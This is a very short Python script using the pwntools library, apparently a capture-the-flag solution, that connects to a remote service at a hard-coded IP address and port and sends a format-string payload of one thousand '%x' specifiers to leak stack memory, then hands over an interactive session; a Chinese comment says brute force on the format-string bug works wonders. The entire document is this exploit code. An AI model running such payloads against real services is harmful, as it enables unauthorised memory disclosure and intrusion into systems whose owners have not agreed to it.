import pwn

r = pwn.remote("124.16.75.117", 51001)

payload = b"%x" * 1000
# 格式化漏洞，大力出奇迹

r.sendline(payload)

r.interactive()
